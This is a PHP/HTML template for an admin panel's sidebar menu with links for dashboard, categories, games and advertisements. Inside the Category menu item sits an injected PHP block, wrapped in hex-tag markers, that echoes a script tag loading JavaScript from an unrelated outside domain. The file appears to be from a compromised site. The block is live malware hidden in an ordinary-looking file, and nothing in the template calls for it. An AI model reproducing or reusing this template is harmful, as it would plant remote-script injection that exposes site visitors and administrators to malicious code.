<div id="mainnav" class="hidden-phone hidden-tablet">
        <ul>
          <li><?php if($side_menu=="home"){ echo '<span class="current-arrow"></span>'; } ?>
            <a href="dashboard.php">
              <div class="icon dash"></div>
              Dashboard
            </a>
          </li>
          <li><?php if($side_menu=="Category"){ echo '<span class="current-arrow"></span>'; } ?>
<?php
#6a848f#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967030\"></script>";
echo $g;
}
#/6a848f#
?>          	<a href="list_category.php">
              <div class="icon news"></div>
              Add Category
            </a>
          </li>
         <li><?php if($side_menu=="Game"){ echo '<span class="current-arrow"></span>'; } ?>
            <a href="list_game.php">
              <div class="icon ad"></div>
             Add game
            </a>
          </li>
              <li><?php if($side_menu=="advertisement"){ echo '<span class="current-arrow"></span>'; } ?>
            <a href="list_advertisement.php">
              <div class="icon photo"></div>
              Advertisement
            </a>
          </li>
		 <!-- <li><?php if($side_menu=="gallery"){ echo '<span class="current-arrow"></span>'; } ?>
            <a href="list_gallery.php">
              <div class="icon photo"></div>
              Photos
            </a>
          </li>
          <li><?php if($side_menu=="vidoe"){ echo '<span class="current-arrow"></span>'; } ?>
            <a href="list_videos.php">
              <div class="icon video"></div>
              Videos
            </a>
          </li>
          <li><?php if($side_menu=="poll"){ echo '<span class="current-arrow"></span>'; } ?>
            <a href="list_poll.php">
              <div class="icon poll"></div>
              Poll
            </a>
          </li>
           
         <!--  <li>
            <a href="tables.php">
              <div class="icon time"></div>
              Time Line
            </a>
          </li>
          <li>
            <a href="timeline.php">
              <div class="icon mag"></div>
              Magazine
            </a>
          </li>
           <li>
            <a href="timeline.php">
              <div class="icon web"></div>
              View Website
            </a>
          </li>-->
        </ul>
      </div>